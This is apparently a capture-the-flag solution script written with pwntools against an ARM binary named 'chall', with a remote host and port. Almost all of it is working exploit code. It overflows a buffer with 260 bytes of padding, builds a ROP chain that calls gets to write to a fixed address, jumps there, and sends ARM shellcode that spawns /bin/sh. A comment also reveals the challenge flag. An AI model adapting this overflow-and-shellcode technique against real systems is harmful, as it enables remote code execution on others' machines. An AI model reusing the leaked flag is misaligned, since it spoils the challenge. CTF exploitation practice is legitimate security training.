#!/usr/bin/python

from pwn import *

PATH = './chall'

GDBSCRIPT = '''

'''

HOST = '103.152.242.172'
PORT = 6060

def exploit(r):
    shellcode = '\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78'
    # 0x0002366c : pop {r0, r4, pc} 

    payload  = p32(0x0002366c)
    payload += p32(0x720a0) # r0
    payload += p32(0x720a0) # r4
    payload += p32(elf.sym['gets']) # pc
    payload += b'A' * 20  # padding
    payload += p32(0x720a0) # pc
    
    pause()

    r.sendlineafter('?', b'A'*260 + payload)

    pause()

    r.sendline(shellcode)
    # technofair{ez_arm_chall}

    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    # libc = ELF(elf.libc.path)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(['qemu-arm-static', '-g', '1111', PATH], aslr=1)
    exploit(r)